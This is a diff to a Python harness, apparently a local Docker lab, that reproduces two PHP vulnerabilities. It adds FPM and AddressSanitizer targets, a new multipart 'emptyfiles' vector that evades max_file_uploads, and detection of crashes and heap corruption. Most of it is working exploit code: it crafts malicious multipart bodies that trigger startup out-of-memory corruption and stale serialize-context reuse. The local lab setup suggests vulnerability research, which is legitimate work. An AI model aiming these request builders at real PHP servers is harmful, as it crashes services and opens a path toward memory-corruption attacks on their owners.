@@ -52,14 +52,20 @@ PROJECT = "php2shell-" + hashlib.sha1(str(BASE).encode()).hexdigest()[:8]
 PORTS = {
     ("109619", "8.5.11"): 18119,
     ("109619", "8.5.12"): 18120,
+    ("109619-fpm", "8.5.11"): 18121,
+    ("109619-fpm", "8.5.12"): 18122,
     ("109618", "8.5.11"): 18118,
     ("109618", "8.5.12"): 18117,
+    ("109618-asan", "8.5.11"): 18123,
 }
 SERVICES = {
     ("109619", "8.5.11"): "php8511",
     ("109619", "8.5.12"): "php8512",
+    ("109619-fpm", "8.5.11"): "fpm8511",
+    ("109619-fpm", "8.5.12"): "fpm8512",
     ("109618", "8.5.11"): "apache8511",
     ("109618", "8.5.12"): "apache8512",
+    ("109618-asan", "8.5.11"): "apache-asan8511",
 }
 VERSIONS = ("8.5.11", "8.5.12")
 
@@ -68,15 +74,34 @@ VERSIONS = ("8.5.11", "8.5.12")
 # lab lifecycle
 # ---------------------------------------------------------------------------
 def render() -> None:
-    if LAB.exists():
-        shutil.rmtree(LAB)
-    LAB.mkdir(parents=True)
-    for name in ("Dockerfile.cli", "Dockerfile.apache", "apache.conf", "compose.yml"):
+    """Copy templates into lab/ without replacing the directories themselves:
+    running containers bind-mount lab/webroot, and rmtree would leave them
+    pointing at a deleted inode (every request then 404s)."""
+    LAB.mkdir(parents=True, exist_ok=True)
+    for name in (
+        "Dockerfile.cli",
+        "Dockerfile.apache",
+        "Dockerfile.apache-asan",
+        "Dockerfile.fpm",
+        "apache.conf",
+        "php-fpm.conf",
+        "php-fpm-pool.conf",
+        "nginx-8511.conf",
+        "nginx-8512.conf",
+        "zend-alloc-limit.patch",
+        "compose.yml",
+    ):
         shutil.copy2(TEMPLATES / name, LAB / name)
-    webroot = LAB / "webroot"
-    if webroot.exists():
-        shutil.rmtree(webroot)
-    shutil.copytree(TEMPLATES / "webroot", webroot)
+
+    src = TEMPLATES / "webroot"
+    dst = LAB / "webroot"
+    dst.mkdir(exist_ok=True)
+    wanted = {p.name for p in src.iterdir()}
+    for stale in dst.iterdir():
+        if stale.name not in wanted:
+            stale.unlink()
+    for item in src.iterdir():
+        shutil.copy2(item, dst / item.name)
 
 
 def compose(*args: str, check: bool = True, timeout: int = 3600) -> subprocess.CompletedProcess:
@@ -240,9 +265,10 @@ def fire_body(sid: str) -> bytes:
     return part("PHP_SESSION_UPLOAD_PROGRESS", sid) + closing()
 
 
-def chain_109619(php: str, control: bool = False, timeout: int = 30) -> int:
-    service = SERVICES[("109619", php)]
-    port = PORTS[("109619", php)]
+def chain_109619(php: str, control: bool = False, timeout: int = 30, sapi: str = "cli") -> int:
+    key = "109619" if sapi == "cli" else "109619-fpm"
+    service = SERVICES[(key, php)]
+    port = PORTS[(key, php)]
     ensure_running(service)
 
     sid = secrets.token_hex(16)
@@ -252,6 +278,14 @@ def chain_109619(php: str, control: bool = False, timeout: int = 30) -> int:
         r1 = str(st1)
     except (OSError, http.client.HTTPException) as exc:
         r1 = f"error ({type(exc).__name__})"
+
+    # For FPM the master survives and respawns the child, so check whether the
+    # arm request itself killed the child before the fire request arrives.
+    arm_killed = False
+    if sapi == "fpm":
+        time.sleep(0.3)
+        arm_log = logs(service, 20)
+        arm_killed = "exited with code" in arm_log or "exited on signal" in arm_log
 
     died = False
     try:
@@ -263,16 +297,28 @@ def chain_109619(php: str, control: bool = False, timeout: int = 30) -> int:
 
     time.sleep(0.4)
     alive = running(service)
-    log = logs(service, 40)
+    log = logs(service, 60)
     corrupt = "zend_mm_heap corrupted" in log or "heap-use-after-free" in log
-    fired = died or not alive or corrupt
+    if sapi == "fpm":
+        fired = (not arm_killed) and (died or corrupt or st2 in (500, 502))
+    else:
+        fired = died or not alive or corrupt
 
-    print(f"[*] CVE-2026-109619 PHP {php}{' (control)' if control else ''}")
+    print(f"[*] CVE-2026-109619 PHP {php} sapi={sapi}{' (control)' if control else ''}")
     print(f"    R1 arm   {r1}  filename={filename_len} bytes, memory_limit=8M")
+    if sapi == "fpm":
+        print(f"    arm      {'child died (FPM respawned it)' if arm_killed else 'child survived'}")
     print(f"    R2 fire  {r2}")
-    print(f"    worker   {'alive' if alive else 'dead (exit ' + exit_code(service) + ')'}")
+    if sapi == "fpm":
+        state = "child died" if (fired or arm_killed) else ("alive" if alive else "dead")
+        print(f"    worker   {state} (master {'alive' if alive else 'dead'})")
+    else:
+        print(f"    worker   {'alive' if alive else 'dead (exit ' + exit_code(service) + ')'}")
     for line in [ln for ln in log.splitlines() if "corrupt" in ln or "Fatal" in ln][-3:]:
         print(f"    log      {line.strip()}")
+    if sapi == "fpm" and arm_killed:
+        print("    verdict  NO REUSE — child died during the arm request; FPM respawned it")
+        return 3
     print(f"    verdict  {'FIRED — stale serialize context reused' if fired else 'SURVIVED'}")
     return 0 if fired else 1
 
@@ -292,6 +338,21 @@ def headers_body(count: int) -> bytes:
     return buf.getvalue()
 
 
+def emptyfiles_body(count: int) -> bytes:
+    """Many file controls with an empty filename: they still create metadata
+    arrays but do not count toward max_file_uploads (advisory vector)."""
+    buf = io.BytesIO()
+    for i in range(count):
+        buf.write(
+            (
+                f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="f{i}"; '
+                'filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n'
+            ).encode()
+        )
+    buf.write(closing())
+    return buf.getvalue()
+
+
 def nested_body(depth: int, parts: int) -> bytes:
     name = "a" + "[k]" * depth
     buf = io.BytesIO()
@@ -301,13 +362,21 @@ def nested_body(depth: int, parts: int) -> bytes:
     return buf.getvalue()
 
 
-def chain_109618(php: str, vector: str = "headers", repeat: int = 1, timeout: int = 120) -> int:
-    service = SERVICES[("109618", php)]
-    port = PORTS[("109618", php)]
+def chain_109618(
+    php: str,
+    vector: str = "headers",
+    repeat: int = 1,
+    timeout: int = 120,
+    asan: bool = False,
+    count: int = 200_000,
+) -> int:
+    key = "109618-asan" if asan else "109618"
+    service = SERVICES[(key, php)]
+    port = PORTS[(key, php)]
     ensure_running(service)
     before = logs(service, 2000)
 
-    print(f"[*] CVE-2026-109618 PHP {php} vector={vector} repeat={repeat}")
+    print(f"[*] CVE-2026-109618 PHP {php} vector={vector} repeat={repeat}{' asan' if asan else ''}")
     statuses: list[str] = []
     bodies: list[bytes] = []
     died = False
@@ -316,12 +385,16 @@ def chain_109618(php: str, vector: str = "headers", repeat: int = 1, timeout: in
             if vector == "chunked":
                 chunk = b"A" * (1024 * 1024)
                 st, body = post_chunked(port, [chunk] * 48, "/index.php", timeout=timeout)
+            elif vector == "emptyfiles":
+                payload = emptyfiles_body(count)
+                chunks = [payload[i : i + 1024 * 1024] for i in range(0, len(payload), 1024 * 1024)]
+                st, body = post_chunked(port, chunks, "/index.php", timeout=timeout)
             elif vector == "nested":
                 st, body = post(
                     port, nested_body(depth=64, parts=800), "/index.php", timeout=timeout
                 )
             else:
-                st, body = post(port, headers_body(200_000), "/index.php", timeout=timeout)
+                st, body = post(port, headers_body(count), "/index.php", timeout=timeout)
             statuses.append(str(st))
             bodies.append(body)
         except (OSError, http.client.HTTPException) as exc:
@@ -333,7 +406,9 @@ def chain_109618(php: str, vector: str = "headers", repeat: int = 1, timeout: in
     new = logs(service, 4000)
     delta = new[len(before) :] if new.startswith(before) else new
     crash_markers = ("exit signal", "Segmentation fault", "Aborted", "zend_mm_heap corrupted")
+    asan_markers = ("ERROR: AddressSanitizer", "heap-use-after-free", "heap-buffer-overflow")
     crashed = any(m.lower() in delta.lower() for m in crash_markers)
+    asan_hit = any(m.lower() in delta.lower() for m in asan_markers)
     oom = any(b"Allowed memory size" in body for body in bodies)
     oom_only = oom and not crashed
     alive = running(service)
@@ -343,7 +418,9 @@ def chain_109618(php: str, vector: str = "headers", repeat: int = 1, timeout: in
     hits = [ln for ln in delta.splitlines() if any(m.lower() in ln.lower() for m in crash_markers)]
     for line in hits[-3:]:
         print(f"    log      {line.strip()[:160]}")
-    if crashed:
+    if asan_hit:
+        verdict = "ASAN — sanitizer caught the startup-OOM corruption"
+    elif crashed:
         verdict = "CRASHED — request-startup OOM left invalid state behind"
     elif oom_only:
         verdict = "OOM ONLY — startup OOM reached, corruption not observed"
@@ -352,7 +429,7 @@ def chain_109618(php: str, vector: str = "headers", repeat: int = 1, timeout: in
     else:
         verdict = "CLEAN — no OOM, no crash"
     print(f"    verdict  {verdict}")
-    return 0 if crashed else (2 if oom_only else 1)
+    return 0 if (crashed or asan_hit) else (2 if oom_only else 1)
 
 
 # ---------------------------------------------------------------------------
@@ -405,14 +482,19 @@ def main() -> int:
 
     p = sub.add_parser("109619", help="run the stale-global-state chain")
     p.add_argument("--php", choices=VERSIONS, default="8.5.11")
+    p.add_argument("--sapi", choices=["cli", "fpm"], default="cli")
     p.add_argument("--control", action="store_true", help="small filename: no OOM, expect no crash")
     p.add_argument("--timeout", type=int, default=30)
 
     p = sub.add_parser("109618", help="run the request-startup OOM chain")
     p.add_argument("--php", choices=VERSIONS, default="8.5.11")
-    p.add_argument("--vector", choices=["headers", "nested", "chunked"], default="headers")
+    p.add_argument(
+        "--vector", choices=["headers", "nested", "chunked", "emptyfiles"], default="headers"
+    )
     p.add_argument("--repeat", type=int, default=1)
     p.add_argument("--timeout", type=int, default=120)
+    p.add_argument("--asan", action="store_true", help="target the ASAN mod_php build (8.5.11)")
+    p.add_argument("--count", type=int, default=200_000, help="part headers for --vector headers")
 
     p = sub.add_parser("verify", help="run the positive/negative matrix")
     p.add_argument("--all", action="store_true", help="include the 109618 lab")
@@ -429,9 +511,9 @@ def main() -> int:
         down()
         return 0
     if args.action == "109619":
-        return chain_109619(args.php, args.control, args.timeout)
+        return chain_109619(args.php, args.control, args.timeout, args.sapi)
     if args.action == "109618":
-        return chain_109618(args.php, args.vector, args.repeat, args.timeout)
+        return chain_109618(args.php, args.vector, args.repeat, args.timeout, args.asan, args.count)
     if args.action == "verify":
         return verify(args.all)
     return 2
